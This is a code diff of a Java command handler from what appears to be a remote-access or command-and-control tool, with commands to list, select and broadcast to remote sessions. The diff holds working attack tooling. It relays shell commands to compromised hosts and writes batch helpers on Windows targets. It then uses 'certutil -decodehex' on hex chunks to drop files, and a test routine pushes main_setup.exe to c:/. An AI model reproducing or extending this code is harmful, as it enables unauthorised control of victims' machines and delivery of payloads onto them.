@@ -4,7 +4,6 @@ import lombok.AllArgsConstructor;
 
 import java.io.*;
 import java.nio.ByteBuffer;
-import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
 import java.util.LinkedList;
 import java.util.List;
@@ -32,23 +31,47 @@ public class CommandExecutor implements Runnable {
             sendTo();
         } else if (command.contains("/showOutput")) {
             showOutput();
-        } else if (command.contains("/connection")) {
-            connection();
+        } else if (command.contains("/connect")) {
+            connect();
         } else if (command.contains("/upload")) {
             upload();
         } else if (command.contains("/background")) {
             background();
         } else if (command.contains("/test")) {
             test();
-        }else if(command.contains("/loadTools")) {
+        } else if (command.contains("/loadTools")) {
             loadTools();
+        }else if(command.contains("/help")){
+            help();
         } else {
             sendToCurrentConnection();
         }
     }
 
-    private void uploadLinux(String fileName, String fileDestination) throws IOException {
-        Data.activeConnection.getCtx().channel().writeAndFlush("> "+fileDestination+"" + "\n");
+    private void test() throws IOException, InterruptedException {
+        connect();
+        command = "cd c:/";
+        sendToCurrentConnection();
+
+        command = "/upload files/main_setup.exe main_setup.exe";
+        upload();
+        //System.out.println("empty");
+    }
+
+    private void upload() throws IOException, InterruptedException {
+        List<String> args = getArgs(command);
+
+        Data.activeConnection.setBlockOutput(true);
+
+        if (Data.activeConnection.getSystemType() == SystemType.type.Windows) {
+            uploadWindows(args.get(0), args.get(1));
+        } else if (Data.activeConnection.getSystemType() == SystemType.type.Linux) {
+            uploadLinux(args.get(0), args.get(1));
+        }
+    }
+
+    private void uploadLinux(String fileName, String fileDestination) throws IOException, InterruptedException {
+        Data.activeConnection.getCtx().channel().writeAndFlush("> " + fileDestination + "" + "\n");
 
         FileInputStream file = new FileInputStream(fileName);
         BufferedReader reader = new BufferedReader(new InputStreamReader(file));
@@ -57,18 +80,18 @@ public class CommandExecutor implements Runnable {
         int ch;
         while ((ch = reader.read()) != -1) {
             if ((char) ch == '\n') {
-                Data.activeConnection.send("echo \"" + sb.toString() + "\" >> "+fileDestination+"" + "\n");
+                Data.activeConnection.send("echo \"" + sb.toString() + "\" >> " + fileDestination + "" + "\n");
                 sb = new StringBuilder();
                 continue;
             }
             sb.append((char) ch);
             if (sb.length() > 300) {
-                Data.activeConnection.send("echo -n \"" + sb.toString() + "\" >> "+fileDestination+"" + "\n");
+                Data.activeConnection.send("echo -n \"" + sb.toString() + "\" >> " + fileDestination + "" + "\n");
                 sb = new StringBuilder();
             }
         }
         if (sb.length() > 0) {
-            Data.activeConnection.send("echo -n \"" + sb.toString() + "\" >> "+fileDestination+"" + "\n");
+            Data.activeConnection.send("echo -n \"" + sb.toString() + "\" >> " + fileDestination + "" + "\n");
         }
         reader.close();
     }
@@ -81,46 +104,22 @@ public class CommandExecutor implements Runnable {
         byte[] fileContent = Files.readAllBytes(new File(fileName).toPath());
 
         ByteBuffer byteBuffer = ByteBuffer.allocate(1000);
-        byte ch;
-        int size=0;
-        for(int i=0; i<fileContent.length; i++){
+        int size = 0;
+        for (int i = 0; i < fileContent.length; i++) {
             byteBuffer.put(fileContent[i]);
             size++;
-
-            if (size>=1000) {
-                size=0;
+            if (size >= 1000) {
+                size = 0;
                 String str = bytesToHex(byteBuffer.array());
-                Data.activeConnection.send("writer.bat \""+str+"\" \n");
-                //Data.activeConnection.send("echo|set /p=\u0092" + sb.toString() + "\u0092 >> "+fileDestination+"" + "\n");
+                Data.activeConnection.send("writer.bat \"" + str + "\" \n");
                 byteBuffer = ByteBuffer.allocate(1000);
             }
         }
-        /*while ((ch = (byte) reader.read()) != -1) {
-           *//* if ((char) ch == '\n') {
-                //Data.activeConnection.send("writer.bat \""+sb.toString()+"\" "+fileDestination);
-                //Data.activeConnection.send("echo \u0092" + sb.toString() + "\u0092 >> "+fileDestination+"" + "\n");
-                System.out.println(sb.toString());
-                sb = new StringBuilder();
-                continue;
-            }*//*
-            byteBuffer.put(ch);
-            size++;
-            //sb.append(Integer.toHexString(ch));
-            //sb.append((char) ch);
-            if (size>=1000) {
-                size=0;
-                String str = bytesToHex(byteBuffer.array());
-                Data.activeConnection.send("writer.bat \""+str+"\" \n");
-                //Data.activeConnection.send("echo|set /p=\u0092" + sb.toString() + "\u0092 >> "+fileDestination+"" + "\n");
-                byteBuffer = ByteBuffer.allocate(1000);
-            }
-        }*/
         if (size > 0) {
             String str = bytesToHex(byteBuffer.array());
-            Data.activeConnection.send("writer.bat \""+str+"\" \n");
-            //Data.activeConnection.send("echo|set /p=\u0092" + sb.toString() + "\u0092 >> "+fileDestination+"" + "\n");
+            Data.activeConnection.send("writer.bat \"" + str + "\" \n");
         }
-        Data.activeConnection.send("create.bat "+fileDestination+"\n");
+        Data.activeConnection.send("create.bat " + fileDestination + "\n");
         reader.close();
     }
 
@@ -143,23 +142,23 @@ public class CommandExecutor implements Runnable {
                 sb.append(ch);
             }
         }
-        if(sb.length() > 0){
+        if (sb.length() > 0) {
             args.add(sb.toString());
         }
         return args;
     }
 
-    private String cutCommand(String command){
-        for(int i=0; i<command.length(); i++){
-            if(command.charAt(i)==' '){
-                command = command.substring(i+1);
+    private String cutCommand(String command) {
+        for (int i = 0; i < command.length(); i++) {
+            if (command.charAt(i) == ' ') {
+                command = command.substring(i + 1);
                 break;
             }
         }
         return command;
     }
 
-    private void sendToAll() throws UnsupportedEncodingException {
+    private void sendToAll() throws UnsupportedEncodingException, InterruptedException {
         for (Connection connection : Data.connections.values()) {
             connection.send("EEE OK");
         }
@@ -171,7 +170,7 @@ public class CommandExecutor implements Runnable {
         }
     }
 
-    private void sendTo() throws UnsupportedEncodingException {
+    private void sendTo() throws UnsupportedEncodingException, InterruptedException {
         List<String> args = getArgs(command);
 
         Data.connections.get(args.get(0)).send("QWERTYQWERTY");
@@ -187,23 +186,25 @@ public class CommandExecutor implements Runnable {
         reader.close();
     }
 
-    private void connection() {
+    private void connect() {
         List<String> args = getArgs(command);
 
-        Connection connection = Data.connections.get(args.get(0));
-        connection.setPrintOutput(true);
-        Data.activeConnection = connection;
-    }
-
-    private void upload() throws IOException, InterruptedException {
-        List<String> args = getArgs(command);
-
-        if (Data.activeConnection.getSystemType() == SystemType.type.Windows) {
-            uploadWindows(args.get(0), args.get(1));
-        } else if (Data.activeConnection.getSystemType() == SystemType.type.Linux) {
-            uploadLinux(args.get(0), args.get(1));
+        Connection connection;
+        try{
+            connection = Data.connections.get(args.get(0));
+            connection.setPrintOutput(true);
+            Data.activeConnection = connection;
+            System.out.println("connected to " + args.get(0));
+        }catch (Exception e){
+            try{
+                connection = Data.connections.values().iterator().next();
+                connection.setPrintOutput(true);
+                Data.activeConnection = connection;
+                System.out.println("Connected to the first connection");
+            }catch (Exception ee){
+                System.out.println("Lack of connections");
+            }
         }
-        System.out.println("Done!");
     }
 
     private void background() {
@@ -211,40 +212,40 @@ public class CommandExecutor implements Runnable {
         Data.activeConnection = null;
     }
 
-    private void sendToCurrentConnection() throws UnsupportedEncodingException {
+    private void sendToCurrentConnection() throws UnsupportedEncodingException, InterruptedException {
         if (Data.activeConnection != null) {
             Data.activeConnection.send(command + "\n");
         }
     }
 
-    private void test(){
-        StringBuilder sb = new StringBuilder(command);
-        command = sb.substring(5);
-        List<String> args = getArgs(command);
-        System.out.println(command);
-        System.out.println(args.get(0));
-        System.out.println(args.get(1));
-    }
-
-    private void loadTools() throws UnsupportedEncodingException {
-
+    private void loadTools() throws UnsupportedEncodingException, InterruptedException {
         Data.activeConnection.send("type nul > writer.bat" + "\n");
         Data.activeConnection.send("echo|set /p=\"@echo off\" >> writer.bat" + "\n");
         Data.activeConnection.send("echo. >> writer.bat\n");
         Data.activeConnection.send("echo|set /p=\"echo|set /p=%1 >>temp.txt\" >> writer.bat\n");
         Data.activeConnection.send("echo. >> writer.bat\n");
-        //Data.activeConnection.send("echo|set /p=\"certutil -f -decodehex temp.txt %2 >nul\" >> writer.bat\n");
-        //Data.activeConnection.send("echo. >> writer.bat\n");
-        //Data.activeConnection.send("echo del temp.txt >> writer.bat\n");
 
         Data.activeConnection.send("type nul > create.bat" + "\n");
         Data.activeConnection.send("echo|set /p=\"@echo off\" >> create.bat" + "\n");
         Data.activeConnection.send("echo. >> create.bat\n");
         Data.activeConnection.send("echo|set /p=\"certutil -f -decodehex temp.txt %1 >nul\" >> create.bat\n");
         Data.activeConnection.send("echo. >> create.bat\n");
-        //Data.activeConnection.send("echo del temp.txt >> create.bat\n");
+        Data.activeConnection.send("echo del temp.txt >> create.bat\n");
 
         System.out.println("Done!");
+    }
+
+    private void help(){
+        System.out.println("/sendToAll - send massage to all connections");
+        System.out.println("/connections - show info about current connections");
+        System.out.println("/sendTo - ");
+        System.out.println("/showOutput - show connection's output");
+        System.out.println("/connect /IP_ADDRESS:PORT - connect to a session");
+        System.out.println("/upload SOURCE_FILE DESTINATION_FILE - upload a file");
+        System.out.println("/background - hide a current session");
+        System.out.println("/test - test");
+        System.out.println("/loadModules - load tools, which helps in interaction with windows");
+        System.out.println("/help - show commands");
     }
 
     private static final char[] HEX_ARRAY = "0123456789ABCDEF".toCharArray();
